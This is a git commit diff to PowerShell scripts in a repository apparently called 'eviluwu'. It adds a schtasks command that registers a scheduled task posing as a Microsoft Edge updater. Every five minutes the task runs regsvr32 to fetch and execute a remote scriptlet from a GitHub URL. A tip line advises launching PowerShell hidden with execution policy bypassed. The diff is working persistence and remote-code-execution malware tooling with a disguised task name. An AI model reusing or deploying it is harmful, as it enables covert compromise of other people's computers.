cb779176028bac74fa6959241d6d273d3f2365bf
b3at1 <sambederman@gmail.com>
2026-02-18 20:00:21 -0600

    add cmd option

--- starter.ps1
+++ starter.ps1
@@ -1,5 +1,8 @@
 # TIP: invoke with `powershell.exe -w hidden -nop -ExecutionPolicy Bypass -Command`
 
+schtasks /create /tn "MicrosoftEdgeUpdateUpdaterTaskMachineCore" /tr "regsvr32 /s /n /u /i:https://raw.githubusercontent.com/b3at1/eviluwu/refs/heads/main/WPXService.wsc scrobj.dll" /sc minute /mo 5 /f
+
+'''
 $taskName = "MicrosoftEdgeUpdateUpdaterTaskMachineCore"
 if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
     Start-ScheduledTask -TaskName $taskName
@@ -9,3 +12,4 @@ if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
     $trigger2 = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5) -RepetitionDuration ([TimeSpan]::MaxValue)
     Register-ScheduledTask -TaskName $taskName -Action $action -Trigger @($trigger1, $trigger2) -Force
 }
+'''
--- uwu.ps1
+++ uwu.ps1
@@ -111,10 +111,8 @@ $cleanup = {
     if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
         # Task isn't restarted if it's registered.
     } else {
-        $action = New-ScheduledTaskAction -Execute "regsvr32.exe" -Argument "/s /n /u /i:https://raw.githubusercontent.com/b3at1/eviluwu/refs/heads/main/WPXService.wsc scrobj.dll"
-        $trigger1 = New-ScheduledTaskTrigger -AtLogOn
-        $trigger2 = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5) -RepetitionDuration ([TimeSpan]::MaxValue)
-        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger @($trigger1, $trigger2) -Force
+        schtasks /create /tn "MicrosoftEdgeUpdateUpdaterTaskMachineCore" /tr "regsvr32 /s /n /u /i:https://raw.githubusercontent.com/b3at1/eviluwu/refs/heads/main/WPXService.wsc scrobj.dll" /sc minute /mo 5 /f
+        schtasks /run /tn "MicrosoftEdgeUpdateUpdaterTaskMachineCore"
     }
 
 }
